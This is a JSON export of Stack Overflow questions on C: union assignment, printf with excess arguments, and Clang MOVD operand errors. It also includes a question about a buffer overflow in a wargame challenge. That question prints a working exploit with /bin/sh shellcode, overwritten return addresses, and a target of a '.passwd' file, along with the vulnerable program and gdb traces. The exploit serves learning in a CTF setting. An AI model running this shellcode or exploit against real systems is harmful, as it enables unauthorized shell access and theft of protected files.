"https://www.gravatar.com/avatar/87100b6114369140256e64e7ebab7ec9?s=128&d=identicon&r=PG&f=1", "display_name": "muXXmit2X", "link": "https://stackoverflow.com/users/4711812/muxxmit2x"}, "is_accepted": false, "score": 0, "last_activity_date": 1437560497, "creation_date": 1437560497, "answer_id": 31560368, "question_id": 31559319, "link": "https://stackoverflow.com/questions/31559319/how-to-write-union-value-to-an-array-element-in-c/31560368#31560368", "title": "How to write union value to an array element in C?", "body": "<p>Knowing that your <code>union</code> can only hold int values (4 Byte) you could use <code>memcpy</code> to copy the data from <code>Byte1</code> to your array like so:</p>\n\n<pre><code>memcpy(array+7, &amp;Byte1, sizeof(Byte1)); // copies the first 4 Bytes of Byte1 to array[7] \n</code></pre>\n\n<p>And don't forget to include string.h </p>\n\n<pre><code>#include &lt;string.h&gt;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 617, "user_id": 1286717, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DQrBG.jpg?s=128&g=1", "display_name": "Alexander Amelkin", "link": "https://stackoverflow.com/users/1286717/alexander-amelkin"}, "is_accepted": false, "score": 0, "last_activity_date": 1437576209, "creation_date": 1437576209, "answer_id": 31566458, "question_id": 31559319, "link": "https://stackoverflow.com/questions/31559319/how-to-write-union-value-to-an-array-element-in-c/31566458#31566458", "title": "How to write union value to an array element in C?", "body": "<p>While to copy <strong>int</strong>-sized <strong>union</strong>s to <strong>int</strong>s you may indeed use memcpy() as others mentioned, it is totally unclear what you are trying to achieve.</p>\n\n<p>Let me try to describe in English what you do:</p>\n\n<ol>\n<li>Have a 4-byte (or 8-byte, depending on architecture) storage.</li>\n<li>Give it four different names (that is, a,b,c,d all refer to the same storage because of <strong>union</strong> keyword).</li>\n<li>Modify the least significant bit of that storage based on some condition multiple times, each next time overwriting the previous value.</li>\n<li>Copy the last result from the storage into some other storage</li>\n</ol>\n\n<p>The following code yields the same effect with much less effort:</p>\n\n<pre><code>int Byte_that_is_actually_a_word;\n...\nByte_that_is_actually_a_word = (z &gt; 0);\n...\nint array[8];\narray[7] = Byte_that_is_actually_a_word;\n</code></pre>\n\n<p>If instead you wanted to have 3 different boolean values stored in a single element of the resulting <code>array</code>, then you should have done it like this:</p>\n\n<pre><code>union {\n    struct {\n       unsigned int flag_x:1,\n                    flag_y:1,\n                    flag_z:1;\n    };\n    unsigned int all;\n} bitmask;\n\n...\n\nbitmask.flag_x = (x &gt; 0);\nbitmask.flag_y = (y &gt; 0);\nbitmask.flag_z = (z &gt; 0);\n\n...\n\narray[7] = bitmask.all;\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 1027278, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bf5c1c8f529382f17e1118b729668184?s=128&d=identicon&r=PG", "display_name": "Hegde", "link": "https://stackoverflow.com/users/1027278/hegde"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 243, "favorite_count": 0, "answer_count": 3, "score": 0, "last_activity_date": 1437576209, "creation_date": 1437557746, "last_edit_date": 1437558543, "question_id": 31559319, "link": "https://stackoverflow.com/questions/31559319/how-to-write-union-value-to-an-array-element-in-c", "title": "How to write union value to an array element in C?", "body": "<p>I have an union like this -</p>\n\n<pre><code>union\n{\n  int a : 1 ;\n  int b : 1 ;\n  int c : 1 ;\n} Byte1;\n</code></pre>\n\n<p>I am writing TRUE or FALSE to union members.</p>\n\n<pre><code>Byte1.a = x&gt;0;\nByte1.b = y&gt;0;\nByte1.c = z&gt;0;\n</code></pre>\n\n<p>Whole content of union I need to write to an array element</p>\n\n<pre><code>int array[8];\narray[7] = Byte1;\n</code></pre>\n\n<p>But this is throwing error - `incompatible types when assigning to type 'int' from type 'union'</p>\n\n<p>How to assign union to array element in C?</p>\n"}, {"tags": ["c", "printf", "language-lawyer"], "comments": [{"owner": {"reputation": 23582, "user_id": 598289, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/b04c9074fed0dd215caec771c2a9ea98?s=128&d=identicon&r=PG", "display_name": "SJuan76", "link": "https://stackoverflow.com/users/598289/sjuan76"}, "edited": false, "score": 0, "creation_date": 1437587232, "post_id": 31559109, "comment_id": 51095665, "body": "I think this question is like asking &quot;Can a function that accepts varargs take any number of arguments?&quot;. The mechanism that allows the handling of a variable number of arguments works whatever the particulars of how the function uses those arguments..."}], "answers": [{"comments": [{"owner": {"reputation": 71860, "user_id": 366377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/863018588657c38d29f22e72dc81325e?s=128&d=identicon&r=PG", "display_name": "Jens Gustedt", "link": "https://stackoverflow.com/users/366377/jens-gustedt"}, "edited": false, "score": 3, "creation_date": 1437560939, "post_id": 31559126, "comment_id": 51076986, "body": "+1, I wasn&#39;t aware that it is explicitly defined. BTW &quot;not UB&quot; can be optimized, the &quot;not&quot; and the &quot;un&quot; cancel out, remains &quot;defined behavior&quot;."}, {"owner": {"reputation": 13379, "user_id": 1033027, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/b56ea1c43a4ecb1060ec8bcb8d2bce78?s=128&d=identicon&r=PG", "display_name": "Jules", "link": "https://stackoverflow.com/users/1033027/jules"}, "edited": false, "score": 0, "creation_date": 1437577755, "post_id": 31559126, "comment_id": 51089468, "body": "As someone who isn&#39;t familiar with the implementation of C: why evaluate leftover arguments? Assuming the original format string (first argument) is evaluated before the replacements, this seems like it could be optimized."}, {"owner": {"reputation": 58398, "user_id": 3233393, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/c4c576e0ebcdf0efd653269a5b020347?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/3233393/quentin"}, "reply_to_user": {"reputation": 13379, "user_id": 1033027, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/b56ea1c43a4ecb1060ec8bcb8d2bce78?s=128&d=identicon&r=PG", "display_name": "Jules", "link": "https://stackoverflow.com/users/1033027/jules"}, "edited": false, "score": 5, "creation_date": 1437578174, "post_id": 31559126, "comment_id": 51089831, "body": "@JulesMazur Not evaluating arguments would mean that <code>printf(&quot;%d&quot;, ++i);</code> would increment <code>i</code>, while <code>printf(&quot;foo&quot;, ++i);</code> wouldn&#39;t. Which hardly makes any sense and is incredibly obscure. Hence, &quot;as always&quot;, the arguments are evaluated before being passed in, then ignored by the function."}, {"owner": {"reputation": 9922, "user_id": 1813853, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/28c0275422e350591a9f1620cb90d581?s=128&d=identicon&r=PG", "display_name": "Chris Hayes", "link": "https://stackoverflow.com/users/1813853/chris-hayes"}, "reply_to_user": {"reputation": 13379, "user_id": 1033027, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/b56ea1c43a4ecb1060ec8bcb8d2bce78?s=128&d=identicon&r=PG", "display_name": "Jules", "link": "https://stackoverflow.com/users/1033027/jules"}, "edited": false, "score": 6, "creation_date": 1437580444, "post_id": 31559126, "comment_id": 51091504, "body": "@JulesMazur In addition to Quentin&#39;s point, arguments are always evaluated before being passed to functions. Making printf special in that regard would just make all our lives more complicated."}, {"owner": {"reputation": 68702, "user_id": 1593860, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1361e47a8bf06d20ffda9a686ceb7e68?s=128&d=identicon&r=PG", "display_name": "Pete Becker", "link": "https://stackoverflow.com/users/1593860/pete-becker"}, "reply_to_user": {"reputation": 71860, "user_id": 366377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/863018588657c38d29f22e72dc81325e?s=128&d=identicon&r=PG", "display_name": "Jens Gustedt", "link": "https://stackoverflow.com/users/366377/jens-gustedt"}, "edited": false, "score": 4, "creation_date": 1437586610, "post_id": 31559126, "comment_id": 51095294, "body": "@JensGustedt - the term &quot;undefined behavior&quot; is defined by the standard; the term &quot;defined behavior&quot; is not. So the correct phrase is, indeed, &quot;not undefined behavior&quot;."}, {"owner": {"reputation": 71860, "user_id": 366377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/863018588657c38d29f22e72dc81325e?s=128&d=identicon&r=PG", "display_name": "Jens Gustedt", "link": "https://stackoverflow.com/users/366377/jens-gustedt"}, "reply_to_user": {"reputation": 68702, "user_id": 1593860, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1361e47a8bf06d20ffda9a686ceb7e68?s=128&d=identicon&r=PG", "display_name": "Pete Becker", "link": "https://stackoverflow.com/users/1593860/pete-becker"}, "edited": false, "score": 0, "creation_date": 1437596487, "post_id": 31559126, "comment_id": 51101318, "body": "@PeteBecker, how would it define the term &quot;defined&quot;? By saying something like ``the terms &quot;definition&quot; in this International standard is defined to ...&#39;&#39; Have a look a the beginning of Section 3. &quot;Terms, definitions, and symbols&quot; and you see that <i>defining</i> things is all what this International Standard is about. And Section 4 says <i>Undefined behavior is otherwise indicated in this International Standard by the words \u2018\u2018undefined behavior\u2019\u2019 or by the omission of any explicit definition of behavior.</i>"}, {"owner": {"reputation": 68702, "user_id": 1593860, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1361e47a8bf06d20ffda9a686ceb7e68?s=128&d=identicon&r=PG", "display_name": "Pete Becker", "link": "https://stackoverflow.com/users/1593860/pete-becker"}, "reply_to_user": {"reputation": 71860, "user_id": 366377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/863018588657c38d29f22e72dc81325e?s=128&d=identicon&r=PG", "display_name": "Jens Gustedt", "link": "https://stackoverflow.com/users/366377/jens-gustedt"}, "edited": false, "score": 1, "creation_date": 1437623276, "post_id": 31559126, "comment_id": 51109832, "body": "@JensGustedt - having spent eight years as project editor for C++ I&#39;m quite familiar with the structure of standards. The term you suggested, &quot;defined behavior,&quot; is not a technical term in the standard."}, {"owner": {"reputation": 71860, "user_id": 366377, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/863018588657c38d29f22e72dc81325e?s=128&d=identicon&r=PG", "display_name": "Jens Gustedt", "link": "https://stackoverflow.com/users/366377/jens-gustedt"}, "reply_to_user": {"reputation": 68702, "user_id": 1593860, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1361e47a8bf06d20ffda9a686ceb7e68?s=128&d=identicon&r=PG", "display_name": "Pete Becker", "link": "https://stackoverflow.com/users/1593860/pete-becker"}, "edited": false, "score": 0, "creation_date": 1437636652, "post_id": 31559126, "comment_id": 51115036, "body": "@PeteBecker, first I am talking of C and not C++, and then what do you think that the partial sentence <i>explicit definition of behavior</i> means (that I cited)? Definition of behavior, this is all what the standard is about."}], "tags": [], "owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "is_accepted": true, "score": 37, "last_activity_date": 1438151646, "last_edit_date": 1438151646, "creation_date": 1437557242, "answer_id": 31559126, "question_id": 31559109, "link": "https://stackoverflow.com/questions/31559109/is-calling-printf-with-excess-arguments-undefined-behaviour/31559126#31559126", "title": "Is calling printf with excess arguments undefined behaviour?", "body": "<p>Yes, this scenario is explicitly defined by the standard. It is <strong>not</strong> undefined behaviour.</p>\n\n<p>To quote the <code>C11</code> standard, chapter \u00a77.21.6.1, <em>The <code>fprintf()</code> function</em></p>\n\n<blockquote>\n  <p>[...] If the format is exhausted while arguments remain, <strong>the excess arguments are evaluated</strong> (as always) <strong>but are otherwise ignored</strong> [...]</p>\n</blockquote>\n"}, {"comments": [{"owner": {"reputation": 36931, "user_id": 225757, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/e7140b12949e4652885f6bb02b435f42?s=128&d=identicon&r=PG", "display_name": "Roland Illig", "link": "https://stackoverflow.com/users/225757/roland-illig"}, "edited": false, "score": 0, "creation_date": 1607644956, "post_id": 31559270, "comment_id": 115345217, "body": "How do you know that, and why should we trust your answer?"}], "tags": [], "owner": {"reputation": 35, "user_id": 5141643, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ef2ed63074f1fd1760e9d148824f6ab?s=128&d=identicon&r=PG&f=1", "display_name": "vivekn", "link": "https://stackoverflow.com/users/5141643/vivekn"}, "is_accepted": false, "score": 2, "last_activity_date": 1437557615, "creation_date": 1437557615, "answer_id": 31559270, "question_id": 31559109, "link": "https://stackoverflow.com/questions/31559109/is-calling-printf-with-excess-arguments-undefined-behaviour/31559270#31559270", "title": "Is calling printf with excess arguments undefined behaviour?", "body": "<p>Basically, printf (or any formatting function) will look into only 'n' number of %d, %c, %f..., etc in the format string from the variable list argument. Others are simply ignored.</p>\n"}], "owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1083, "favorite_count": 0, "accepted_answer_id": 31559126, "answer_count": 2, "score": 23, "last_activity_date": 1438151928, "creation_date": 1437557189, "last_edit_date": 1438151928, "question_id": 31559109, "link": "https://stackoverflow.com/questions/31559109/is-calling-printf-with-excess-arguments-undefined-behaviour", "title": "Is calling printf with excess arguments undefined behaviour?", "body": "<p>I wonder if this yields in undefined behaviour:</p>\n\n<pre><code>printf(\"Test %d %s\", 123, \"abc\", \"def\", \"ghi\");\n</code></pre>\n\n<p>The first two arguments after the format string match the format string, so these are OK; but the 3rd and 4th arguments are in excess because there are no more corresponding format specifiers.</p>\n\n<p>IMHO <code>printf()</code> should simply ignore these excess arguments and there should be no UB. Is this correct?</p>\n"}, {"tags": ["c", "buffer-overflow"], "comments": [{"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1437557824, "post_id": 31559092, "comment_id": 51074785, "body": "Please indent your code."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1437557851, "post_id": 31559092, "comment_id": 51074803, "body": "You should look at the assembly output of the compiler."}, {"owner": {"reputation": 14308, "user_id": 1989425, "user_type": "registered", "accept_rate": 38, "profile_image": "https://i.stack.imgur.com/aGyIU.png?s=128&g=1", "display_name": "autistic", "link": "https://stackoverflow.com/users/1989425/autistic"}, "edited": false, "score": 0, "creation_date": 1437615902, "post_id": 31559092, "comment_id": 51108118, "body": "<b>This is not a C question!</b> Once your compiler translates your C code into machine code, the machine code is no longer C code. The exact machine code/assembly your C code is translated depends largely upon the compiler you use, and the amount of <i>stack space</i> (if there is any, and/or if it doesn&#39;t expand) required to reach <i><code>eip</code></i> (again, if there is one) also depends upon the system beyond the scope of C."}], "answers": [{"comments": [{"owner": {"reputation": 9, "user_id": 5142500, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/12021f2d6004291495d32d0f7ca506d9?s=128&d=identicon&r=PG&f=1", "display_name": "Bodhi Dharma", "link": "https://stackoverflow.com/users/5142500/bodhi-dharma"}, "edited": false, "score": 0, "creation_date": 1437725745, "post_id": 31576692, "comment_id": 51161285, "body": "What i was thinking of, is feed edx with secret file so i can read it once it&#39;s stored into buffer."}], "tags": [], "owner": {"reputation": 23069, "user_id": 156811, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/380335e95e6be9740e56b64d667279b3?s=128&d=identicon&r=PG", "display_name": "Havenard", "link": "https://stackoverflow.com/users/156811/havenard"}, "is_accepted": false, "score": 0, "last_activity_date": 1437614981, "last_edit_date": 1437614981, "creation_date": 1437614649, "answer_id": 31576692, "question_id": 31559092, "link": "https://stackoverflow.com/questions/31559092/buffer-overflow-doesnt-reach-eip/31576692#31576692", "title": "buffer overflow doesn&#39;t reach eip", "body": "<p>I didn't analyze it in detail, but it seems you are not overflowing <code>init</code> in <code>main()</code>, you are overflowing <code>init</code> in <code>Init()</code>, but its proving resilient to overflow because theres a 513 bytes buffer reserved right after it, spacing you from the sensitive call stack information you want to attack.</p>\n\n<p>Once <code>Init()</code> returns this struct to <code>main()</code> through a copy operation, only <code>sizeof(struct Init)</code> bytes are copied, so its not cascading the vulnerability to the function that you want to attack.</p>\n\n<p>I believe if you want to trigger the vulnerability without interference of any of this, you should overwrite <code>main()</code>'s <code>init</code> directly, by passing it to <code>Init()</code> as a pointer, like <code>void Init(char *filename, struct Init *init)</code>.</p>\n"}], "owner": {"reputation": 9, "user_id": 5142500, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/12021f2d6004291495d32d0f7ca506d9?s=128&d=identicon&r=PG&f=1", "display_name": "Bodhi Dharma", "link": "https://stackoverflow.com/users/5142500/bodhi-dharma"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 545, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1454367520, "creation_date": 1437557152, "last_edit_date": 1438086699, "question_id": 31559092, "link": "https://stackoverflow.com/questions/31559092/buffer-overflow-doesnt-reach-eip", "title": "buffer overflow doesn&#39;t reach eip", "body": "<p>Hi i'm really stuck on this problem: here are my code and below the code i try to overflow:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#define B 145 // 141 for ex overflow\n#define A 0\n\nchar sc[]=\n        \"\\x31\\xc0\\x50\\x68//sh\\x68/bin\\x89\\xe3\"\n        \"\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b\\xcd\\x80\";\nvoid main()\n{\n        char *env[2] = {sc, NULL};\n        char buf[B];\n        int     i;\n        int     *ap = (int*)(buf + A);\n        int     ret = 0xbffffffa - strlen(sc) - strlen(\"/challenge/app-systeme/ch10/ch10\");\n        FILE    *file;\n\n        for (i = 0; i &lt; B - 4; i += 4)\n        {\n               if (i == 136)\n                        *ap++ = 0xbffffc64;\n                else if (i == 98)\n                {\n                        *ap++ = \"/challenge/app-systeme/.passwd\";//edx\n                }\n                else\n                {\n                        if (i &gt;= 50)\n                        *ap++ = 0x42424242;\n                        else if (i &lt; 50)\n                        *ap++ = 0xbfffffb1;//0x45454545;\n                }\n        }\n\n        file = fopen(\"/tmp/toto/COUCOU\", \"a+\");\n        fprintf(file, \"%s%s\", \"USERNAME=\", buf);\n        fclose(file);\n\n        printf(\"AAAAWESOME\");\n        execle(\"/challenge/app-systeme/ch10/ch10\", \"ch10\", \"/tmp/toto/COUCOU\", NULL, env);\n}\n</code></pre>\n\n<p>Vulnerable code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;ctype.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/types.h&gt;\n\n#define BUFFER 512\n\nstruct Init\n{\n    char username[128];\n    uid_t uid;\n    pid_t pid;\n\n};\n\nvoid cpstr(char *dst, const char *src)\n{\n    for(; *src; src++, dst++)\n    {\n        *dst = *src;\n    }\n    *dst = 0;\n}\nvoid chomp(char *buff)\n{\n    for(; *buff; buff++)\n    {\n        if(*buff == '\\n' || *buff == '\\r' || *buff == '\\t')\n        {\n           *buff = 0;\n            break;\n        }\n    }\n}\nstruct Init Init(char *filename)\n{\n\n    FILE *file;\n    struct Init init;\n    char buff[BUFFER+1];\n\n\n    if((file = fopen(filename, \"r\")) == NULL)\n    {\n        perror(\"[-] fopen \");\n        exit(0);\n    }\n\n    memset(&amp;init, 0, sizeof(struct Init));\n\n    init.pid = getpid();\n    init.uid = getuid();\n\n    while(fgets(buff, BUFFER, file) != NULL)\n    {\n        chomp(buff);\n        if(strncmp(buff, \"USERNAME=\", 9) == 0)\n        {\n            cpstr(init.username, buff+9);\n        }\n    }\n    fclose(file);\n    return init;\n}\nint main(int argc, char **argv)\n{\n    struct Init init;\n    if(argc != 2)\n    {\n        printf(\"Usage : %s &lt;config_file&gt;\\n\", argv[0]);\n        exit(0);\n    }\n    init = Init(argv[1]);\n    printf(\"[+] Runing the program with username %s, uid %d and pid %d.\\n\", init.username, init.uid, init.pid);\n\n    return 0;\n}\n</code></pre>\n\n<p>Indeed i can't reach eip as gdb usually shows a segfault happening into the loop:</p>\n\n<p>esi is the first register crushed after the overflow but i still don't get what feed him.</p>\n\n<p>It's a buffer size at this point, i can then even fill edi and edx, but still what for ?</p>\n\n<p>Is eip still unreachable ?</p>\n\n<p>Well typically :</p>\n\n<pre><code>gdb$ r\nprocess 14534 is executing new program: /challenge/app-systeme/ch10/ch10\n\nProgram received signal SIGSEGV, Segmentation fault.\n--------------------------------------------------------------------------[regs]\n  EAX: 0x00000000  EBX: 0xB7FCFFF4  ECX: 0x42424242  EDX: 0x42424242  o d I t s z a P c \n  ESI: 0xBFFFFC64  EDI: 0x000001FF  EBP: 0xBFFFFC64  ESP: 0xBFFFF8EC  EIP: 0xB7E9CD88                                     \n  CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B\n--------------------------------------------------------------------------[code]\n=&gt; 0xb7e9cd88:  mov    ecx,DWORD PTR [edx+0x8]\n   0xb7e9cd8b:  mov    edx,DWORD PTR [edx]\n   0xb7e9cd8d:  cmp    eax,ecx\n   0xb7e9cd8f:  cmovg  eax,ecx\n   0xb7e9cd92:  test   edx,edx\n   0xb7e9cd94:  jne    0xb7e9cd88\n   0xb7e9cd96:  repz ret \n   0xb7e9cd98:  nop\n--------------------------------------------------------------------------------\n0xb7e9cd88 in ?? () from /lib/i386-linux-gnu/libc.so.6\ngdb$ bt\n#0  0xb7e9cd88 in ?? () from /lib/i386-linux-gnu/libc.so.6\n#1  0xb7e9cdc4 in ?? () from /lib/i386-linux-gnu/libc.so.6\n#2  0xb7e9d2e4 in __uflow () from /lib/i386-linux-gnu/libc.so.6\n#3  0xb7e90d3a in _IO_getline_info () from /lib/i386-linux-gnu/libc.so.6\n#4  0xb7e90c83 in _IO_getline () from /lib/i386-linux-gnu/libc.so.6\n#5  0xb7e8fc20 in fgets () from /lib/i386-linux-gnu/libc.so.6\n#6  0x08048685 in Init (filename=0xbfffffb1 \"/tmp/toto/COUCOU\") at binary10.c:56\n#7  0x08048716 in main (argc=0x2, argv=0xbffffed4) at binary10.c:75\n</code></pre>\n\n<p>Well, it seems I forgot to mention the partial RELRO state of the binary.</p>\n\n<p>Anymore light is welcome .</p>\n\n<pre><code>    (gdb) disas __uflow\n    Dump of assembler code for function __uflow:\n       0xb7e9d270 &lt;+0&gt;:     push   %esi\n       0xb7e9d271 &lt;+1&gt;:     push   %ebx\n  ...\n       0xb7e9d37c &lt;+268&gt;:   lea    0x0(%esi,%eiz,1),%esi\n    =&gt; 0xb7e9d380 &lt;+272&gt;:   movzbl (%edx),%eax\n       0xb7e9d383 &lt;+275&gt;:   add    $0x1,%edx\n ...\n       0xb7e9d3b3 &lt;+323&gt;:   call   0xb7e92ca0\n       0xb7e9d3b8 &lt;+328&gt;:   jmp    0xb7e9d2b1 &lt;__uflow+65&gt;\n    End of assembler dump.\n    (gdb) x/i $eax\n       0xb7e9c588 &lt;_IO_file_overflow+424&gt;:  add    %bh,-0x1(%eax)\n    (gdb) vim ok\n    Undefined command: \"vim\".  Try \"help\".\n    (gdb) x/i $edx\n       0x806c000:   Cannot access memory at address 0x806c000\n    (gdb)\n</code></pre>\n\n<p>Something can detect the overflow ?</p>\n\n<p>Well, this is resolved. But trust me i don't have a clue of what i've done, and if anybody could teach us all a lesson he'd be Welcome.</p>\n"}, {"tags": ["c", "assembly", "clang", "llvm", "inline-assembly"], "comments": [{"owner": {"reputation": 51929, "user_id": 1524450, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/BSzDV.png?s=128&g=1", "display_name": "Michael", "link": "https://stackoverflow.com/users/1524450/michael"}, "edited": false, "score": 0, "creation_date": 1437557068, "post_id": 31558916, "comment_id": 51074267, "body": "I don&#39;t see <code>r&#47;m64, xmm</code> being listed as a valid operand combination for <code>MOVD</code> in Intel&#39;s manual. Did you mean to use <code>MOVQ</code> (or <code>edi</code> instead of <code>rdi</code>)?"}], "answers": [{"comments": [{"owner": {"reputation": 82953, "user_id": 608639, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/aPIhh.jpg?s=128&g=1", "display_name": "jww", "link": "https://stackoverflow.com/users/608639/jww"}, "edited": false, "score": 0, "creation_date": 1437564868, "post_id": 31561316, "comment_id": 51079569, "body": "Thanks Michael. Today is literally my day to clear all these remaining issues with Clang... It looks like the same few sets of problems are being encountered on a recurring basis..."}, {"owner": {"reputation": 82953, "user_id": 608639, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/aPIhh.jpg?s=128&g=1", "display_name": "jww", "link": "https://stackoverflow.com/users/608639/jww"}, "reply_to_user": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 0, "creation_date": 1437565006, "post_id": 31561316, "comment_id": 51079647, "body": "@Peter - forgive my ignorance... Are you saying I need to set the high 32-bits of <code>rdi</code> to 0 before the <code>movq</code>? Or maybe set the high 32-bits of <code>xmm1</code> to 0 after the <code>movq</code>? Or is it operational minusca that I can safely ignore?"}, {"owner": {"reputation": 51929, "user_id": 1524450, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/BSzDV.png?s=128&g=1", "display_name": "Michael", "link": "https://stackoverflow.com/users/1524450/michael"}, "edited": false, "score": 1, "creation_date": 1437565254, "post_id": 31561316, "comment_id": 51079810, "body": "<code>movd edi,xmm1</code> would clear the high 32 bits of <code>rdi</code>."}, {"owner": {"reputation": 240639, "user_id": 224132, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/N4ivW.png?s=128&g=1", "display_name": "Peter Cordes", "link": "https://stackoverflow.com/users/224132/peter-cordes"}, "edited": false, "score": 1, "creation_date": 1437568173, "post_id": 31561316, "comment_id": 51081926, "body": "Yep, this means 32bit ops don&#39;t depend on the previous value of the register (short dep chains are very important for out-of-order execution / register renaming).  It also means you can use 32bit ops, and then use it in a 64bit context.  (e.g. as part of an address: <code>inc ecx &#47; mov eax, [rdi + 4*rcx]</code>)"}, {"owner": {"reputation": 82953, "user_id": 608639, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/aPIhh.jpg?s=128&g=1", "display_name": "jww", "link": "https://stackoverflow.com/users/608639/jww"}, "edited": false, "score": 0, "creation_date": 1437639891, "post_id": 31561316, "comment_id": 51116871, "body": "Michael, Peter - <code>movq rdi, xmm0</code> did not compile (<i>register %rdi is only available in 64-bit mode</i>), so it was not the <code>movq</code>. <code>movd edi, xmm0</code> compiled, but the program failed its self tests.... I could scream right around now... I&#39;m going to have to keep working on this :("}, {"owner": {"reputation": 51929, "user_id": 1524450, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/BSzDV.png?s=128&g=1", "display_name": "Michael", "link": "https://stackoverflow.com/users/1524450/michael"}, "edited": false, "score": 0, "creation_date": 1437640364, "post_id": 31561316, "comment_id": 51117164, "body": "Are you building for a 32-bit or 64-bit target (or both)? Perhaps you need to <code>#define</code> a macro that expands to <code>movd</code> or <code>movq</code> depending on the target bitness, similar to how <code>WORD_REG</code> adds either an <code>e</code> or <code>r</code> prefix."}], "tags": [], "owner": {"reputation": 51929, "user_id": 1524450, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/BSzDV.png?s=128&g=1", "display_name": "Michael", "link": "https://stackoverflow.com/users/1524450/michael"}, "is_accepted": true, "score": 3, "last_activity_date": 1437563119, "creation_date": 1437563119, "answer_id": 31561316, "question_id": 31558916, "link": "https://stackoverflow.com/questions/31558916/clang-integrated-assembler-and-invalid-operand-for-instruction/31561316#31561316", "title": "Clang integrated assembler and &quot;invalid operand for instruction&quot;", "body": "<p><code>r/m64, xmm</code> is not listed as a valid operand combination for the <code>MOVD</code> instruction in Intel's Software Developers' Manual. However, the following two forms are supported:</p>\n\n<pre><code>MOVD r/m32, xmm\nSSE2 Move doubleword from xmm register to r/m32.\n\nMOVQ r/m64, xmm\nSSE2 Move quadword from xmm register to r/m64.\n</code></pre>\n\n<p>Which makes me suspect that the <code>MOVD</code> instruction needs to be a <code>MOVQ</code> when building for 64-bit targets, or that <code>rdi</code> is supposed to be replaced by <code>edi</code> (although that might affect other parts of the code that rely on the top 32 bits of <code>rdi</code>).</p>\n"}], "owner": {"reputation": 82953, "user_id": 608639, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/aPIhh.jpg?s=128&g=1", "display_name": "jww", "link": "https://stackoverflow.com/users/608639/jww"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 4842, "favorite_count": 0, "accepted_answer_id": 31561316, "answer_count": 1, "score": 1, "last_activity_date": 1437617599, "creation_date": 1437556644, "last_edit_date": 1437617599, "question_id": 31558916, "link": "https://stackoverflow.com/questions/31558916/clang-integrated-assembler-and-invalid-operand-for-instruction", "title": "Clang integrated assembler and &quot;invalid operand for instruction&quot;", "body": "<p>We are using Clang in a default configuration. In the default configuration, Clang's 